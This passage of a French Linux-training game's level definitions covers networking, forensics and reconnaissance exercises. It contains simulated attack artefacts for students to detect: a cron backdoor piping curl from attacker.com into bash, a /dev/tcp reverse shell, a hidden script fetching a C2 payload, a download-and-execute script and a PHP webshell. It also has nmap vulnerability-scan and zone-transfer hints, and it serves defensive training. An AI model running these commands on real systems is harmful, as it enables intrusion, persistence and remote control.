    description: "`tar -czvf archive.tar.gz dossier/` crée une archive compressée. Ensuite `scp archive.tar.gz user@host:/path/` la transfère. Les deux étapes sont les gestes standards de sauvegarde.",
    commands: ['tar', 'scp'],
    hints: [
      "`tar -czvf backup.tar.gz /etc/` — archive le dossier /etc.",
      "`scp backup.tar.gz admin@192.168.1.10:/backups/` — transfère.",
      "Les options tar : c=créer, z=gzip, v=verbose, f=nom du fichier."
    ],
    fileSystem: {
      'etc': {
        'nginx': {
          'nginx.conf': 'server { listen 80; server_name edulinux.local; }'
        }
      }
    },
    validation: [
      { type: 'command', value: 'tar -czvf', description: 'Créer une archive compressée' },
      { type: 'command', value: 'scp', description: 'Transférer l\'archive' }
    ],
    story: "📦 Avant la mise à jour du serveur, sauvegarde la config et transfère-la sur le serveur de backup."
  },

  // 🛰️ Niveaux 41-50 : Réseau
  {
    id: 41,
    title: "Interfaces réseau",
    difficulty: 'intermediate',
    category: "Réseau",
    objective: "Observer les interfaces avec ip addr",
    description: "`ip addr` (ou `ip a`) liste toutes les interfaces réseau, leurs adresses IP et leur état (UP/DOWN). Remplace l'ancien `ifconfig` sur les systèmes modernes.",
    commands: ['ip'],
    hints: [
      "`ip addr` — toutes les interfaces avec leurs IPs.",
      "`ip addr show eth0` — uniquement l'interface eth0.",
      "Repère l'adresse IPv4 (inet) et IPv6 (inet6) de chaque interface."
    ],
    fileSystem: {},
    validation: [
      { type: 'command', value: 'ip addr', description: 'Lister les interfaces et adresses IP' }
    ],
    story: "🌐 Le serveur ne répond pas sur le réseau. Quelle est son adresse IP et son interface principale ?"
  },
  {
    id: 42,
    title: "Ports ouverts",
    difficulty: 'intermediate',
    category: "Réseau",
    objective: "Lister les connexions avec ss",
    description: "`ss -tulnp` liste les ports en écoute : `t`=TCP, `u`=UDP, `l`=listen, `n`=numérique, `p`=processus. Remplace `netstat` sur les systèmes récents.",
    commands: ['ss'],
    hints: [
      "`ss -tulnp` — tous les ports en écoute avec le processus.",
      "`ss -tnp` — connexions TCP établies.",
      "Cherche un port inhabituel ou un service inconnu dans la liste."
    ],
    fileSystem: {},
    validation: [
      { type: 'command', value: 'ss -tulnp', description: 'Lister les ports en écoute' }
    ],
    story: "🔍 Un port inconnu est ouvert sur ce serveur. Identifie quel processus l'utilise."
  },
  {
    id: 43,
    title: "Table de routage",
    difficulty: 'intermediate',
    category: "Réseau",
    objective: "Lire la table de routage avec ip route",
    description: "`ip route` (ou `ip r`) affiche la table de routage : quelle interface pour quelle destination, et quelle passerelle (default gateway).",
    commands: ['ip'],
    hints: [
      "`ip route` — affiche toutes les routes.",
      "La ligne `default via X.X.X.X` indique la passerelle par défaut.",
      "`ip route get 8.8.8.8` — quelle route serait utilisée pour joindre cette IP ?"
    ],
    fileSystem: {},
    validation: [
      { type: 'command', value: 'ip route', description: 'Afficher la table de routage' }
    ],
    story: "🗺️ Le serveur ne peut pas atteindre Internet. La passerelle par défaut est-elle correctement configurée ?"
  },
  {
    id: 44,
    title: "Diagnostic DNS",
    difficulty: 'intermediate',
    category: "Réseau",
    objective: "Résoudre un nom de domaine avec dig",
    description: "`dig domaine` interroge les serveurs DNS. La section ANSWER contient les enregistrements trouvés (A=IPv4, AAAA=IPv6, MX=mail, CNAME=alias). `dig +short domaine` affiche juste l'IP.",
    commands: ['dig'],
    hints: [
      "`dig google.com` — résolution complète avec TTL.",
      "`dig +short google.com` — juste l'adresse IP.",
      "`dig MX gmail.com` — serveurs mail de Gmail."
    ],
    fileSystem: {},
    validation: [
      { type: 'command', value: 'dig', description: 'Résoudre un nom de domaine via DNS' }
    ],
    story: "🌍 Le site web répond à l'IP mais pas au nom de domaine. Le DNS est-il bien configuré ?"
  },
  {
    id: 45,
    title: "Test de connectivité",
    difficulty: 'beginner',
    category: "Réseau",
    objective: "Utiliser ping et traceroute",
    description: "`ping hôte` envoie des paquets ICMP pour tester la joignabilité. `traceroute hôte` (ou `tracepath`) trace le chemin réseau saut par saut.",
    commands: ['ping', 'traceroute'],
    hints: [
      "`ping 8.8.8.8` — teste si l'hôte répond (3 paquets dans le simulateur).",
      "`traceroute 8.8.8.8` — voit chaque routeur traversé.",
      "Un `* * *` dans traceroute = ce saut ne répond pas (firewall)."
    ],
    fileSystem: {},
    validation: [
      { type: 'command', value: 'ping', description: 'Tester la joignabilité d\'un hôte' },
      { type: 'command', value: 'traceroute', description: 'Tracer le chemin réseau' }
    ],
    story: "📡 Le serveur de backup ne répond plus. Est-il joignable ? Y a-t-il un blocage réseau en route ?"
  },
  {
    id: 46,
    title: "Capture réseau (lecture)",
    difficulty: 'advanced',
    category: "Réseau",
    objective: "Lire une sortie tcpdump simulée",
    description: "`tcpdump` capture les paquets réseau. **Sur un vrai système il faut des droits root.** Ici on te donne une sortie simulée à analyser : identifie les IPs, protocoles et ports impliqués.",
    commands: ['tcpdump', 'cat', 'grep'],
    hints: [
      "Commence par lire `capture.txt` avec cat.",
      "`grep 'SYN' capture.txt` — connexions TCP initiées.",
      "Format : `heure IP_source.port > IP_dest.port: flags`."
    ],
    fileSystem: {
      'capture.txt': `14:23:01.123456 IP 192.168.1.50.54321 > 10.0.0.1.22: Flags [S], seq 0, win 65535
14:23:01.124000 IP 10.0.0.1.22 > 192.168.1.50.54321: Flags [S.], seq 0, ack 1, win 65535
14:23:01.125000 IP 192.168.1.50.54321 > 10.0.0.1.22: Flags [.], ack 1, win 65535
14:23:05.000000 IP 10.10.10.99.45678 > 10.0.0.1.80: Flags [S], seq 0 (connexion HTTP suspecte)
14:23:05.001000 IP 10.10.10.99.45678 > 10.0.0.1.80: Flags [S], seq 1 (tentative répétée)
14:23:10.000000 IP 192.168.1.1.53 > 192.168.1.50.12345: UDP DNS réponse google.com`
    },
    validation: [
      { type: 'command', value: 'grep', description: 'Filtrer les lignes de capture intéressantes' }
    ],
    story: "🎣 Une capture réseau a été faite lors d'un incident. Analyse-la pour repérer les connexions anormales."
  },
  {
    id: 47,
    title: "Règles de pare-feu",
    difficulty: 'advanced',
    category: "Réseau",
    objective: "Lire les règles iptables",
    description: "`iptables -L -n -v` liste les règles (sans résolution DNS). Colonnes : target (action), prot (protocole), source, destination. Les actions courantes : ACCEPT, DROP, REJECT.",
    commands: ['iptables'],
    hints: [
      "`iptables -L -n -v` — toutes les chaînes (INPUT, OUTPUT, FORWARD).",
      "Une règle `DROP` en INPUT bloque les paquets entrants.",
      "Dans ce simulateur, la sortie est statique mais réaliste."
    ],
    fileSystem: {},
    validation: [
      { type: 'command', value: 'iptables -L', description: 'Lister les règles du pare-feu' }
    ],
    story: "🛡️ Le port 443 ne répond plus alors que nginx tourne. Le pare-feu bloque-t-il le trafic HTTPS ?"
  },
  {
    id: 48,
    title: "Transfert sécurisé avancé",
    difficulty: 'advanced',
    category: "Réseau",
    objective: "Utiliser rsync pour synchroniser des dossiers",
    description: "`rsync -avz source/ user@host:/dest/` synchronise en ne transférant que les fichiers modifiés. Plus efficace que scp pour des dossiers. `-a`=archive (préserve droits/dates), `-v`=verbose, `-z`=compression.",
    commands: ['rsync'],
    hints: [
      "`rsync -avz /var/www/ admin@backup:/ var/www/` — synchronise le site.",
      "`rsync -avzn` — dry-run (simulation sans transfert réel).",
      "Option `--delete` : supprime côté destination ce qui n'existe plus à la source."
    ],
    fileSystem: {
      'var': {
        'www': {
          'index.html': '<html><body>EduLinux Site</body></html>',
          'style.css': 'body { background: #0a0a0a; }'
        }
      }
    },
    validation: [
      { type: 'command', value: 'rsync', description: 'Synchroniser un dossier avec rsync' }
    ],
    story: "🔄 Le serveur de production et le serveur de backup ont divergé. Synchronise les fichiers web efficacement."
  },
  {
    id: 49,
    title: "Tunnel SSH",
    difficulty: 'advanced',
    category: "Réseau",
    objective: "Comprendre le port-forwarding SSH",
    description: "SSH peut créer des tunnels : `ssh -L port_local:hote_distant:port_distant user@jump` redirige un port à travers SSH. Utile pour accéder à un service interne depuis l'extérieur de façon sécurisée.",
    commands: ['ssh'],
    hints: [
      "`ssh -L 8080:10.0.0.5:80 admin@jumpserver` — accède au port 80 interne via localhost:8080.",
      "Le `-L` signifie Local forwarding.",
      "Le `-N` ajoute en option empêche l'ouverture d'un shell (tunnel pur)."
    ],
    fileSystem: {
      'network_map.txt': `Réseau interne:
  jumpserver : 192.168.1.100 (accessible depuis Internet)
  db-server  : 10.0.0.5 (port 5432, PostgreSQL — interne uniquement)
  web-server : 10.0.0.10 (port 80 — interne uniquement)

Objectif : accède au web-server interne (port 80) depuis ton poste.`
    },
    validation: [
      { type: 'command', value: 'ssh -L', description: 'Créer un tunnel SSH local' }
    ],
    story: "🔒 Le serveur de base de données n'est pas exposé à Internet. Crée un tunnel SSH pour y accéder en toute sécurité."
  },
  {
    id: 50,
    title: "Requêtes HTTP en ligne de commande",
    difficulty: 'intermediate',
    category: "Réseau",
    objective: "Analyser des réponses HTTP avec curl -I et curl -v",
    description: "`curl -I URL` envoie uniquement la requête HEAD (headers). `curl -v URL` affiche la connexion complète (handshake, headers, corps). Utile pour diagnostiquer des API ou des sites.",
    commands: ['curl'],
    hints: [
      "`curl -I https://example.com` — code HTTP + headers sans corps.",
      "`curl -v https://example.com` — tout : connexion TLS, headers, réponse.",
      "Le code de statut : 200=OK, 301=redirect, 403=interdit, 404=introuvable, 500=erreur serveur."
    ],
    fileSystem: {},
    validation: [
      { type: 'command', value: 'curl -I', description: 'Récupérer uniquement les headers HTTP' },
      { type: 'command', value: 'curl -v', description: 'Mode verbeux pour diagnostiquer' }
    ],
    story: "🌐 L'API renvoie une erreur mystérieuse. Inspecte les headers HTTP pour comprendre ce qui se passe."
  },

  // 🔬 Niveaux 51-60 : Forensic Linux (intro)
  {
    id: 51,
    title: "Analyse de logs auth",
    difficulty: 'advanced',
    category: "Forensic",
    objective: "Extraire les connexions suspectes d'auth.log",
    description: "`/var/log/auth.log` enregistre toutes les tentatives d'authentification. Utilise `grep`, `cut`, `sort`, `uniq -c` pour identifier des IP qui tentent de se connecter en masse.",
    commands: ['grep', 'cut', 'sort', 'uniq'],
    hints: [
      "`cat auth.log | grep 'Failed password'` — toutes les tentatives échouées.",
      "`grep 'Failed' auth.log | grep -oE '[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+'` — extraire les IPs.",
      "Pipe vers `sort | uniq -c | sort -rn` pour compter par IP."
    ],
    fileSystem: {
      'auth.log': `Jan 15 02:10:01 server sshd[1234]: Failed password for root from 45.33.32.156 port 47621 ssh2
Jan 15 02:10:02 server sshd[1234]: Failed password for root from 45.33.32.156 port 47622 ssh2
Jan 15 02:10:03 server sshd[1234]: Failed password for admin from 45.33.32.156 port 47623 ssh2
Jan 15 02:10:04 server sshd[1234]: Failed password for root from 45.33.32.156 port 47624 ssh2
Jan 15 02:10:05 server sshd[1235]: Accepted password for student from 192.168.1.50 port 54321 ssh2
Jan 15 02:10:15 server sshd[1234]: Failed password for root from 103.99.0.122 port 51234 ssh2
Jan 15 02:10:16 server sshd[1234]: Failed password for root from 103.99.0.122 port 51235 ssh2
Jan 15 02:11:00 server sshd[1234]: Failed password for root from 45.33.32.156 port 47700 ssh2
Jan 15 02:15:00 server sudo[2345]: student : TTY=pts/0 ; PWD=/home/student ; USER=root ; COMMAND=/bin/cat /etc/shadow`
    },
    validation: [
      { type: 'command', value: 'grep Failed', description: 'Filtrer les tentatives échouées' },
      { type: 'command', value: 'sort', description: 'Trier et dénombrer les IPs suspectes' }
    ],
    story: "🚨 Le SOC a détecté une activité anormale sur SSH cette nuit. Analyse le fichier auth.log pour identifier l'IP la plus agressive."
  },
  {
    id: 52,
    title: "Timeline de fichiers",
    difficulty: 'advanced',
    category: "Forensic",
    objective: "Observer les dates de modification avec stat et find -newer",
    description: "`stat fichier` affiche les 3 timestamps : `atime` (accès), `mtime` (modification), `ctime` (changement de métadonnées). `find . -newer fichier_ref` liste les fichiers modifiés après une référence.",
    commands: ['stat', 'find', 'ls'],
    hints: [
      "`stat suspect.php` — voir exactement quand ce fichier a été modifié.",
      "`ls -lt` — liste triée par date (plus récent en premier).",
      "`find /var/www -newer /tmp/reference -name '*.php'` — PHP modifiés récemment."
    ],
    fileSystem: {
      'var': {
        'www': {
          'html': {
            'index.php': '<?php echo "Site normal"; ?>',
            'contact.php': '<?php echo "Contact"; ?>',
            'upload.php': '<?php system($_GET["cmd"]); ?> // WEBSHELL SUSPECT',
            'style.css': 'body { margin: 0; }'
          }
        }
      }
    },
    validation: [
      { type: 'command', value: 'stat', description: 'Afficher les timestamps d\'un fichier' },
      { type: 'command', value: 'find', description: 'Trouver les fichiers modifiés récemment' }
    ],
    story: "🕵️ Le site web a été compromis. Un fichier malveillant a été déposé récemment. Établis une timeline et trouve-le."
  },
  {
    id: 53,
    title: "Intégrité par hash",
    difficulty: 'advanced',
    category: "Forensic",
    objective: "Vérifier l'intégrité de fichiers avec sha256sum",
    description: "En forensic, on compare les **hashes** de fichiers suspects à des références connues. `sha256sum fichier` calcule l'empreinte. `sha256sum -c checksums.txt` compare un lot de fichiers.",
    commands: ['sha256sum', 'md5'],
    hints: [
      "`sha256sum malware.bin` — calcule l'empreinte SHA256.",
      "Compare à la base IOC dans `known_hashes.txt`.",
      "Si les empreintes correspondent au fichier de référence : potentiellement malveillant (hash connu)."
    ],
    fileSystem: {
      'known_hashes.txt': `# Hashes de malwares connus (fictifs pour l'exercice)
aabbcc1234567890aabbcc1234567890aabbcc1234567890aabbcc1234567890  mimikatz.exe
deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef  ransomware.bin
5d41402abc4b2a76b9719d911017c592  test_benignes.txt`,
      'malware.bin': '[BINAIRE SUSPECT — calcule son hash et compare]',
      'info.txt': 'Calcule le hash SHA256 de malware.bin puis compare au fichier known_hashes.txt'
    },
    validation: [
      { type: 'command', value: 'sha256sum', description: 'Calculer l\'empreinte SHA256 d\'un fichier suspect' }
    ],
    story: "🔬 Un fichier suspect a été récupéré sur le serveur compromis. Vérifie son intégrité en le comparant à une base de hashes connus."
  },
  {
    id: 54,
    title: "Persistance via cron",
    difficulty: 'advanced',
    category: "Forensic",
    objective: "Détecter une persistance malveillante dans crontab",
    description: "Les attaquants utilisent souvent `crontab` pour maintenir un accès même après reboot. Vérifie : `crontab -l`, `/etc/cron.d/`, `/etc/cron.daily/`, `/var/spool/cron/`.",
    commands: ['crontab', 'cat', 'ls'],
    hints: [
      "`crontab -l` — tâches de l'utilisateur courant.",
      "`cat /etc/cron.d/backdoor` — un fichier suspect y a peut-être été déposé.",
      "Repère les commandes qui téléchargent ou exécutent des scripts depuis Internet."
    ],
    fileSystem: {
      'etc': {
        'cron.d': {
          'system-update': '0 3 * * * root /usr/bin/apt-get update -y',
          'monitoring': '*/5 * * * * root /usr/local/bin/monitor.sh',
          'backdoor': '* * * * * root curl http://attacker.com/rev.sh | bash'
        }
      }
    },
    validation: [
      { type: 'command', value: 'cat /etc/cron.d', description: 'Inspecter les tâches cron système' }
    ],
    story: "🦠 Même après réinstallation, l'attaquant revient. Un mécanisme de persistance subsiste quelque part dans les crons système."
  },
  {
    id: 55,
    title: "Processus suspects",
    difficulty: 'advanced',
    category: "Forensic",
    objective: "Identifier un processus anormal avec ps et lsof",
    description: "`ps aux` liste tous les processus. `lsof -p PID` (list open files) montre les fichiers/connexions ouverts par un processus. Ensemble : identifier un processus et ses activités réseau ou fichiers suspects.",
    commands: ['ps', 'lsof'],
    hints: [
      "`ps aux | grep -v '^USER'` — tous les processus sauf l'en-tête.",
      "`ps aux | sort -k3 -rn | head` — top CPU.",
      "`lsof -p 1337` — fichiers et connexions du processus PID 1337."
    ],
    fileSystem: {
      'process_analysis.txt': `Analyse des processus suspects :

  PID  USER      %CPU  COMMAND
  1337 www-data  98.2  /tmp/.svc -c http://185.220.101.5:8080
  1338 www-data   0.0  /bin/bash -i >& /dev/tcp/185.220.101.5/4444 0>&1

Indicateurs d'alerte :
  - Processus dans /tmp (pas un répertoire légitime pour des binaires)
  - Connexion réseau depuis un shell (bash avec /dev/tcp)
  - CPU très élevé pour un service web`,
    },
    validation: [
      { type: 'command', value: 'ps aux', description: 'Lister tous les processus' },
      { type: 'command', value: 'lsof', description: 'Inspecter les fichiers ouverts d\'un processus' }
    ],
    story: "🔎 Un processus inconnu tourne sur le serveur et consomme du CPU. Identifie-le et vois à quoi il se connecte."
  },
  {
    id: 56,
    title: "Utilisateurs connectés",
    difficulty: 'intermediate',
    category: "Forensic",
    objective: "Voir les sessions actives et l'historique avec who et last",
    description: "`who` affiche les utilisateurs connectés en ce moment. `last` affiche l'historique des connexions (source du fichier `wtmp`). `lastb` montre les tentatives échouées (`btmp`).",
    commands: ['who', 'last'],
    hints: [
      "`who` — sessions SSH actives actuellement.",
      "`last | head -20` — 20 dernières connexions réussies.",
      "`last | grep 'still logged'` — sessions encore actives."
    ],
    fileSystem: {
      'sessions_suspicious.txt': `Historique extrait (last) :
  admin    pts/1  185.220.101.5  Wed Jan 15 03:14   still logged in ← SUSPECT
  student  pts/0  192.168.1.10   Wed Jan 15 09:00 - 17:00
  root     pts/2  10.10.10.1     Tue Jan 14 22:00 - 22:30

Session suspecte :
  - Heure : 03h14 (hors heures normales)
  - IP source : 185.220.101.5 (pas un réseau interne)
  - Toujours connecté → session active à investiguer`
    },
    validation: [
      { type: 'command', value: 'who', description: 'Afficher les utilisateurs connectés' },
      { type: 'command', value: 'last', description: 'Historique des connexions' }
    ],
    story: "👥 Quelqu'un s'est connecté au serveur hier soir à 3h depuis une IP inhabituelle. Retrouve-le dans l'historique."
  },
  {
    id: 57,
    title: "Fichiers cachés et attributs",
    difficulty: 'advanced',
    category: "Forensic",
    objective: "Trouver des fichiers cachés et lire leurs attributs avec lsattr",
    description: "`ls -la` révèle les fichiers commençant par `.` (cachés). `lsattr fichier` affiche les attributs étendus Linux (ex. `i` = immutable, empêche la suppression même par root).",
    commands: ['ls', 'lsattr'],
    hints: [
      "`ls -la` — les fichiers `.nomfichier` sont cachés par `ls` normal.",
      "`lsattr .hidden_script` — attribut `i` = immutable (méthode d'évasion).",
      "Cherche dans `/tmp`, `/dev/shm`, `/var/tmp` — répertoires souvent utilisés."
    ],
    fileSystem: {
      '.hidden_script': '#!/bin/bash\ncurl http://c2.attacker.com/payload | bash',
      '.env_backup': 'DB_PASSWORD=super_secret_prod\nAPI_KEY=sk-prod-xxxxx',
      'README.txt': 'Fichiers normaux uniquement visibles ici...',
      'tmp': {
        '.c2_agent': '[BINAIRE — agent C2 caché dans /tmp]'
      }
    },
    validation: [
      { type: 'command', value: 'ls -la', description: 'Lister y compris les fichiers cachés' },
      { type: 'command', value: 'lsattr', description: 'Afficher les attributs étendus' }
    ],
    story: "🙈 L'arborescence semble propre... mais l'attaquant est patient. Cherche ce qui se cache."
  },
  {
    id: 58,
    title: "Analyse de trafic DNS",
    difficulty: 'advanced',
    category: "Forensic",
    objective: "Détecter une exfiltration via DNS dans des logs",
    description: "L'exfiltration DNS encode des données dans des requêtes DNS (`data.c2domain.com`). Dans les logs, cela se manifeste par des sous-domaines longs et aléatoires vers un même domaine racine.",
    commands: ['grep', 'cut', 'sort', 'uniq'],
    hints: [
      "`cat dns.log | grep -v 'google\\|cloudflare'` — filtrer les résolveurs légitimes.",
      "`awk '{print $5}' dns.log | cut -d. -f2-` — extraire les domaines racines.",
      "Un domaine qui reçoit des centaines de requêtes avec des sous-domaines longs = suspect."
    ],
    fileSystem: {
      'dns.log': `2024-01-15 14:00:01 192.168.1.50 > 8.8.8.8 A google.com
2024-01-15 14:00:02 192.168.1.50 > 8.8.8.8 A github.com
2024-01-15 14:01:00 192.168.1.50 > 8.8.8.8 A aGVsbG8td29ybGQ.c2exfil.xyz
2024-01-15 14:01:01 192.168.1.50 > 8.8.8.8 A dGhpcyBpcy1zZWNy.c2exfil.xyz
2024-01-15 14:01:02 192.168.1.50 > 8.8.8.8 A ZXQtZGF0YS5mb3I.c2exfil.xyz
2024-01-15 14:01:03 192.168.1.50 > 8.8.8.8 A YXR0YWNrZXItb25s.c2exfil.xyz
2024-01-15 14:02:00 192.168.1.50 > 8.8.8.8 A stackoverflow.com
2024-01-15 14:03:00 192.168.1.50 > 8.8.8.8 A eW91LWZvdW5kLWl0.c2exfil.xyz`
    },
    validation: [
      { type: 'command', value: 'grep c2exfil', description: 'Isoler les requêtes vers le domaine suspect' }
    ],
    story: "📡 Des données confidentielles quittent le réseau... mais le pare-feu ne bloque que le port 443. Analyse les logs DNS pour détecter l'exfiltration."
  },
  {
    id: 59,
    title: "Script de collecte forensic",
    difficulty: 'advanced',
    category: "Forensic",
    objective: "Créer un script bash de triage initial",
    description: "En réponse à incident, on collecte rapidement : date, hostname, utilisateurs connectés, processus, connexions réseau, tâches cron. Un script bash automatise ce **triage initial** (ou *live response*).",
    commands: ['echo', 'chmod', 'who', 'ps', 'ss'],
    hints: [
      "⚠️ Utilise toujours des guillemets simples : `echo '#!/bin/bash' > triage.sh` (sans guillemets, le `#` est un commentaire bash).",
      "Ajoute des commandes : `who >> triage.sh`, `ps aux >> triage.sh`, `ss -tulnp >> triage.sh`.",
      "Rends-le exécutable : `chmod +x triage.sh`, puis exécute : `./triage.sh`."
    ],
    fileSystem: {
      'triage_template.sh': `#!/bin/bash
# Template de triage forensic — à compléter

echo "=== DATE ===" >> rapport.txt
date >> rapport.txt

echo "=== HOSTNAME ===" >> rapport.txt
hostname >> rapport.txt

# Ajoute ici : who, ps aux, ss -tulnp, crontab -l, etc.
`,
      'triage_checklist.txt': `Checklist triage initial (live response) :
  [x] Date/heure système (décalage NTP ?)
  [x] Hostname et IP
  [ ] Utilisateurs connectés (who, last)
  [ ] Processus actifs (ps aux)
  [ ] Connexions réseau (ss -tulnp)
  [ ] Tâches cron (crontab -l, /etc/cron.d/)
  [ ] Fichiers récemment modifiés (find / -mtime -1)
  [ ] Modules kernel chargés (lsmod)`
    },
    validation: [
      { type: 'command', value: 'echo >', description: 'Créer triage.sh avec echo et redirection (echo ... > triage.sh)' },
      { type: 'command', value: './triage.sh', description: 'Exécuter le script de collecte' }
    ],
    story: "⚡ L'incident vient d'être détecté. Tu as 5 minutes avant que l'équipe de gestion arrive. Collecte les preuves volatiles maintenant."
  },
  {
    id: 60,
    title: "Mission : Réponse à incident complète",
    difficulty: 'advanced',
    category: "Forensic",
    objective: "Enchaîner toutes les techniques pour reconstruire un incident",
    description: "Mission finale de la section forensic. Tu disposes d'un système post-compromission. Reconstruis **qui, quand, comment** : logs d'auth, processus, crons, fichiers suspects, connexions réseau. Documente tes findings.",
    commands: ['grep', 'cat', 'ps', 'ss', 'find', 'stat', 'sha256sum', 'last'],
    hints: [
      "1. `last` — qui s'est connecté ?",
      "2. `cat auth.log | grep Failed` — tentatives de brute-force ?",
      "3. `ps aux` — processus suspect ?",
      "4. `ss -tulnp` — port inhabituel ?",
      "5. `find / -newer /tmp/ref -name '*.sh' 2>/dev/null` — fichiers déposés récemment ?"
    ],
    fileSystem: {
      'auth.log': `Jan 15 01:00:00 server sshd: Failed password for root from 185.220.101.5 port 12345 ssh2
Jan 15 01:00:01 server sshd: Failed password for root from 185.220.101.5 port 12346 ssh2
Jan 15 01:00:02 server sshd: Failed password for root from 185.220.101.5 port 12347 ssh2
Jan 15 01:00:45 server sshd: Accepted password for admin from 185.220.101.5 port 12400 ssh2
Jan 15 01:01:00 server sudo: admin : COMMAND=/bin/bash`,
      'suspect.sh': '#!/bin/bash\ncurl http://185.220.101.5/payload -o /tmp/.x && chmod +x /tmp/.x && /tmp/.x &',
      'cron.txt': '* * * * * root /tmp/.x'
    },
    validation: [
      { type: 'command', value: 'cat auth.log', description: 'Lire les logs d\'authentification' },
      { type: 'command', value: 'cat suspect.sh', description: 'Examiner le script malveillant' },
      { type: 'command', value: 'grep Failed', description: 'Identifier l\'IP source de l\'attaque' }
    ],
    story: "🏆 MISSION FORENSIC FINALE : Un serveur de production a été compromis hier soir. Tu es la première personne arrivée. Les preuves sont volatiles. Reconstitue la chaîne d'attaque avant toute chose."
  },

  // 🌐 Niveaux 61-70 : Reconnaissance & Scanning
  {
    id: 61,
    title: "Nmap — Scan de base",
    difficulty: 'intermediate',
    category: "Reconnaissance",
    objective: "Scanner les ports d'une cible avec nmap",
    description: "`nmap IP` lance un scan TCP SYN sur les 1000 ports les plus courants. Options essentielles : `-p-` (tous les ports), `-sV` (version des services), `-Pn` (pas de ping préalable).",
    commands: ['nmap'],
    hints: [
      "`nmap 10.0.0.5` — scan rapide des 1000 ports courants.",
      "`nmap -p 22,80,443 10.0.0.5` — scan de ports spécifiques.",
      "Les ports ouverts sont marqués `open`, fermés `closed`, filtrés `filtered`."
    ],
    fileSystem: {
      'targets.txt': `# Cibles autorisées (lab uniquement)
10.0.0.5   — serveur web présumé
10.0.0.10  — serveur de fichiers présumé
10.0.0.20  — base de données présumée`
    },
    validation: [
      { type: 'command', value: 'nmap', description: 'Lancer un scan nmap sur une cible' }
    ],
    story: "🎯 Tu as une cible IP. Avant toute chose : découvrir quels ports sont ouverts et quels services tournent."
  },
  {
    id: 62,
    title: "Nmap — Détection de services",
    difficulty: 'intermediate',
    category: "Reconnaissance",
    objective: "Identifier les versions de services avec nmap -sV",
    description: "`nmap -sV` tente d'identifier la version exacte de chaque service (Apache 2.4.51, OpenSSH 8.2, etc.). `-sC` lance les scripts NSE par défaut (bannières, info SSL…). Combiner : `nmap -sV -sC IP`.",
    commands: ['nmap'],
    hints: [
      "`nmap -sV 10.0.0.5` — versions des services sur les ports ouverts.",
      "`nmap -sV -sC 10.0.0.5` — versions + scripts de base (banner, http-title...).",
      "`nmap -A 10.0.0.5` — mode agressif : sV + sC + OS detection + traceroute."
    ],
    fileSystem: {
      'scan_notes.txt': `Rappel : nmap -sV peut être bruyant (détecté par IDS).
Sur un pentest réel, adapter la vitesse : -T2 (discret) à -T5 (rapide).
Les scripts NSE sont dans /usr/share/nmap/scripts/`
    },
    validation: [
      { type: 'command', value: 'nmap -sV', description: 'Scanner avec détection de versions' }
    ],
    story: "🔎 Un port 80 est ouvert. Quelle version d'Apache tourne là-dessus ? Est-ce vulnérable ?"
  },
  {
    id: 63,
    title: "Nmap — Scripts NSE",
    difficulty: 'advanced',
    category: "Reconnaissance",
    objective: "Utiliser les scripts Nmap (NSE) pour l'énumération",
    description: "Le Nmap Scripting Engine (NSE) permet d'automatiser des tâches : `--script=http-title,http-headers` récupère les headers HTTP. `--script=vuln` teste les vulnérabilités connues. `--script=dns-zone-transfer` tente un transfert de zone DNS.",
    commands: ['nmap'],
    hints: [
      "`nmap --script=http-title 10.0.0.5 -p 80` — titre de la page web.",
      "`nmap --script=banner 10.0.0.5` — bannières de tous les services.",
      "`nmap --script=vuln -p 80,443 10.0.0.5` — test de vulnérabilités (bruyant !)."
    ],
    fileSystem: {
      'nse_cheatsheet.txt': `Scripts utiles :
  http-title        : titre de la page
  http-headers      : headers HTTP complets  
  http-robots.txt   : contenu robots.txt
  ssl-cert          : détails du certificat SSL
  dns-zone-transfer : tentative de zone transfer
  smb-vuln-ms17-010 : test EternalBlue
  ssh-auth-methods  : méthodes auth SSH
  ftp-anon          : accès FTP anonyme`
    },
    validation: [
      { type: 'command', value: 'nmap --script', description: 'Utiliser un script NSE' }
    ],
    story: "📜 Le serveur expose plusieurs services. Un script NSE peut automatiquement trouver des informations que tu mettrais des heures à collecter manuellement."
  },
  {
    id: 64,
    title: "DNS — Énumération avancée",
    difficulty: 'intermediate',
    category: "DNS",
    objective: "Réaliser une reconnaissance DNS complète",
    description: "`dig axfr domaine @serveur` tente un transfert de zone (Zone Transfer) — si mal configuré, révèle TOUS les sous-domaines. `dig ANY domaine` demande tous les enregistrements. `host -t mx domaine` cherche les serveurs mail.",
    commands: ['dig', 'host'],
    hints: [
      "`dig axfr target.local @10.0.0.100` — tentative de zone transfer.",
      "`dig ANY target.local @10.0.0.100` — tous les enregistrements DNS.",
      "`dig txt target.local` — enregistrements TXT (souvent des infos SPF, DMARC)."
    ],
    fileSystem: {
      'dns_notes.txt': `Enregistrements DNS importants :
  A     : IPv4 (nom → IP)
  AAAA  : IPv6
  MX    : serveurs mail
  NS    : serveurs de noms autoritaires
  TXT   : texte libre (SPF, DKIM, vérification domaine)
  CNAME : alias
  PTR   : reverse DNS (IP → nom)
  SOA   : Start of Authority (infos admin de la zone)

Zone Transfer (AXFR) : si autorisé, liste TOUS les enregistrements.
C'est une mauvaise configuration fréquente sur les anciens serveurs DNS.`
    },
    validation: [
      { type: 'command', value: 'dig axfr', description: 'Tenter un transfert de zone DNS' }
    ],
    story: "🌐 Le DNS interne est peut-être mal configuré. Un transfert de zone révèlerait la carte complète du réseau interne."
  },
  {
    id: 65,
    title: "Netcat — Le couteau suisse TCP",
    difficulty: 'intermediate',
    category: "Réseau",
    objective: "Utiliser netcat pour tester des connexions et lire des bannières",
    description: "`nc hôte port` ouvre une connexion TCP brute. Utile pour : lire une bannière de service, tester si un port répond, envoyer une requête HTTP manuelle. `nc -l -p port` met en écoute.",
    commands: ['nc'],
    hints: [
      "`nc 10.0.0.5 22` — se connecter au port SSH et lire la bannière.",
      "`nc 10.0.0.5 80` puis taper `HEAD / HTTP/1.0` + Entrée = requête HTTP brute.",
      "`echo 'HEAD / HTTP/1.0' | nc 10.0.0.5 80` — version non-interactive."
    ],
    fileSystem: {
      'services.txt': `Ports à tester sur 10.0.0.5 :
  22  : SSH
  25  : SMTP
  80  : HTTP
  110 : POP3
  143 : IMAP
  3306: MySQL`
    },
    validation: [
      { type: 'command', value: 'nc', description: 'Utiliser netcat pour tester un port' }
    ],
    story: "🔌 Sans nmap, sans aucun outil spécialisé, netcat seul peut déjà donner beaucoup d'informations sur un service."
  },
  {
    id: 66,
    title: "VLAN — Segmentation réseau",
